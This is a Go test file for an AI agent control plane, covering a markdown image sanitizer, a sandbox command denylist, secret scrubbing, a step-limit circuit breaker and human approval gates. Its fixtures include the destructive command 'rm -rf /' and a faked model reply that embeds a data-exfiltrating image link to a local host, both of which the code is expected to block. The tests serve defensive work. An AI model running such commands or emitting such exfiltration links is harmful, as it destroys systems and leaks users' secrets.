package controlplane

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/t0ul/gledger"
	"github.com/t0ul/gonductor"
)

func tempAudit(t *testing.T) (*gledger.AuditLog, func() (bool, int)) {
	t.Helper()
	p := filepath.Join(t.TempDir(), "audit.jsonl")
	a, err := gledger.Open(p, "test")
	if err != nil {
		t.Fatal(err)
	}
	return a, func() (bool, int) { return gledger.VerifyFile(p) }
}

// fakeGateway serves OpenAI-style chat completions, branching on the model.
func fakeGateway(t *testing.T, byModel map[string]string) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Trace-Id") == "" {
			t.Error("gateway: missing X-Trace-Id header")
		}
		var req chatRequest
		json.NewDecoder(r.Body).Decode(&req)
		content, ok := byModel[req.Model]
		if !ok {
			http.Error(w, "unknown model", http.StatusBadRequest)
			return
		}
		json.NewEncoder(w).Encode(chatResponse{Choices: []struct {
			Message chatMessage `json:"message"`
		}{{Message: chatMessage{Role: "assistant", Content: content}}}})
	}))
}

func fakeMicroVM(t *testing.T, output string) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req detonateRequest
		json.NewDecoder(r.Body).Decode(&req)
		json.NewEncoder(w).Encode(detonateResponse{Output: output, TraceID: "vm1"})
	}))
}

func TestSanitizeMarkdownStripsImages(t *testing.T) {
	in := "intro ![a](http://x/p?d=1) mid ![b](http://y) end"
	out, n := SanitizeMarkdown(in)
	if n != 2 {
		t.Fatalf("expected 2 images stripped, got %d", n)
	}
	if strings.Contains(out, "http://x") || strings.Contains(out, "http://y") {
		t.Fatalf("image URL survived sanitizer: %q", out)
	}
	if strings.Count(out, "[IMAGE BLOCKED BY SANITIZER]") != 2 {
		t.Fatalf("expected 2 block markers: %q", out)
	}
}

func TestInterpreterBlocksForbiddenSignature(t *testing.T) {
	audit, verify := tempAudit(t)
	// MicroVM must never be reached for a blocked command.
	vm := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {
		t.Error("blocked command reached the MicroVM")
	}))
	defer vm.Close()
	in := &Interpreter{MicroVMURL: vm.URL, Audit: audit, HTTP: vm.Client()}
	out := in.ExecuteInSandbox(context.Background(), "t", "rm -rf /")
	if !strings.Contains(out, "BLOCKED") {
		t.Fatalf("expected BLOCKED, got %q", out)
	}
	if ok, _ := verify(); !ok {
		t.Error("audit chain should verify")
	}
}

func TestInterpreterDetonates(t *testing.T) {
	audit, _ := tempAudit(t)
	vm := fakeMicroVM(t, "total 0\n")
	defer vm.Close()
	in := &Interpreter{MicroVMURL: vm.URL, Audit: audit, HTTP: vm.Client()}
	out := in.ExecuteInSandbox(context.Background(), "t", "ls -la")
	if out != "total 0\n" {
		t.Fatalf("expected sandbox output, got %q", out)
	}
}

func TestMiddlewareScrubsSecret(t *testing.T) {
	audit, _ := tempAudit(t)
	mw := NewMiddleware(audit)
	safe, blocked := mw.Sanitize(context.Background(), "t", "export API_KEY=sk-abc123deadbeef and ip 10.0.0.1")
	if blocked {
		t.Fatal("clean input should not be blocked")
	}
	if strings.Contains(safe, "sk-abc123deadbeef") {
		t.Fatalf("secret survived scrub: %q", safe)
	}
}

func TestMiddlewareTopicBlock(t *testing.T) {
	audit, _ := tempAudit(t)
	mw := NewMiddleware(audit, "launch the missiles")
	_, blocked := mw.Sanitize(context.Background(), "t", "please launch the missiles now")
	if !blocked {
		t.Fatal("off-topic input should be blocked by the denylist rail")
	}
}

func TestCircuitBreakerHaltsPlanner(t *testing.T) {
	audit, _ := tempAudit(t)
	// LLM points nowhere; the breaker must return before any call.
	o := &Orchestrator{LLM: NewLLMClient("http://127.0.0.1:0/v1/chat/completions"), Audit: audit}
	gc := &gonductor.Context{Context: context.Background(), TraceID: "t"}
	s, err := o.planner(gc, State{TraceID: "t", StepCount: MaxSessionSteps})
	if err != nil {
		t.Fatalf("breaker should not error: %v", err)
	}
	if s.BlogPlan != haltSentinel {
		t.Fatalf("expected halt sentinel, got %q", s.BlogPlan)
	}
}

func TestOrchestratorHappyPathSanitizesExfil(t *testing.T) {
	audit, verify := tempAudit(t)
	gw := fakeGateway(t, map[string]string{
		"planner": "- point one\n- point two\n- point three\nCOMMAND: ls -la /var/log",
		"coder":   "# Report\n![Data Sync](http://127.0.0.1:9999/log?data=SECRET)\nAll good.",
	})
	defer gw.Close()
	vm := fakeMicroVM(t, "total 0\n")
	defer vm.Close()

	o := &Orchestrator{
		LLM:     &LLMClient{BaseURL: gw.URL, HTTP: gw.Client()},
		Interp:  &Interpreter{MicroVMURL: vm.URL, Audit: audit, HTTP: vm.Client()},
		Audit:   audit,
		Approve: func(State) bool { return true },
	}
	final, err := o.Run(context.Background(), "t", "user terminal history")
	if err != nil {
		t.Fatal(err)
	}
	if final.ToolCommand != "ls -la /var/log" {
		t.Fatalf("planner command not selected: %q", final.ToolCommand)
	}
	if final.ToolOutput != "total 0\n" {
		t.Fatalf("sandbox output missing: %q", final.ToolOutput)
	}
	if strings.Contains(final.FinalMarkdown, "127.0.0.1:9999") {
		t.Fatalf("exfil image URL survived: %q", final.FinalMarkdown)
	}
	if !strings.Contains(final.FinalMarkdown, "[IMAGE BLOCKED BY SANITIZER]") {
		t.Fatalf("image not sanitized: %q", final.FinalMarkdown)
	}
	if ok, n := verify(); !ok || n == 0 {
		t.Fatalf("audit chain failed: ok=%v n=%d", ok, n)
	}
}

func TestOrchestratorHITLDenyHalts(t *testing.T) {
	audit, _ := tempAudit(t)
	gw := fakeGateway(t, map[string]string{"planner": "- a\n- b\n- c\nCOMMAND: whoami"})
	defer gw.Close()
	vm := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {
		t.Error("executor ran despite HITL denial")
	}))
	defer vm.Close()

	o := &Orchestrator{
		LLM:     &LLMClient{BaseURL: gw.URL, HTTP: gw.Client()},
		Interp:  &Interpreter{MicroVMURL: vm.URL, Audit: audit, HTTP: vm.Client()},
		Audit:   audit,
		Approve: func(State) bool { return false }, // deny
	}
	final, err := o.Run(context.Background(), "t", "history")
	if err != nil {
		t.Fatal(err)
	}
	if final.ToolCommand != "" {
		t.Fatalf("command executed after denial: %q", final.ToolCommand)
	}
	if final.FinalMarkdown != haltMessage {
		t.Fatalf("expected halt message, got %q", final.FinalMarkdown)
	}
}

func TestNilApproverDeniesByDefault(t *testing.T) {
	audit, _ := tempAudit(t)
	gw := fakeGateway(t, map[string]string{"planner": "- a\n- b\n- c\nCOMMAND: whoami"})
	defer gw.Close()
	o := &Orchestrator{
		LLM:    &LLMClient{BaseURL: gw.URL, HTTP: gw.Client()},
		Interp: &Interpreter{MicroVMURL: "http://127.0.0.1:0", Audit: audit, HTTP: http.DefaultClient},
		Audit:  audit,
		// Approve nil
	}
	final, err := o.Run(context.Background(), "t", "history")
	if err != nil {
		t.Fatal(err)
	}
	if final.FinalMarkdown != haltMessage {
		t.Fatalf("nil approver must deny; got %q", final.FinalMarkdown)
	}
}
